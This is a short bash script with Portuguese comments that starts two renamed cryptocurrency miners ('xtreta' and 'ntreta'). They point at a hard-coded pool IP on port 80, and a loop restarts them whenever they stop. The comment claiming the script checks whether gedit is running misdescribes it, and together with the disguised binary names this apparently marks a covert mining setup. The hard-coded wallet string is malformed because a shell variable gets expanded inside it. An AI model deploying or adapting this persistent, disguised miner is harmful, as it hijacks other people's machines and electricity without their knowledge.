#!/bin/bash xD
# Verifica se o gedit está sendo executado
NOMEMAQUINA="$2";
CARTEIRA="$1"
./xtreta --donate-level 1 -o 144.217.82.15:80 -u $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$NOMEMAQUINA -p x -k -a rx/0 &
sleep 1;
./ntreta -a ethash  -log -o 144.217.82.15:80 -u $CARTEIRA.$NOMEMAQUINA &

while true; do
	sleep 60;
	clear
	NOMEMAQUINA="$2";
	CARTEIRA="$1"
	if pgrep "xtreta" > /dev/null
	then
		echo "Executando - xtreta" $NOMEMAQUINA;
	else
		echo "Parado - xtreta";
		./xtreta --donate-level 1 -o 144.217.82.15:80 -u $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$NOMEMAQUINA -p x -k -a rx/0 &
	fi

	if pgrep "ntreta" > /dev/null
	then
		echo "Executando - ntreta" $NOMEMAQUINA;
	else
		echo "Parado - ntreta";
		./ntreta -a ethash  -log -o 144.217.82.15:80 -u $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$NOMEMAQUINA &
	fi	

done
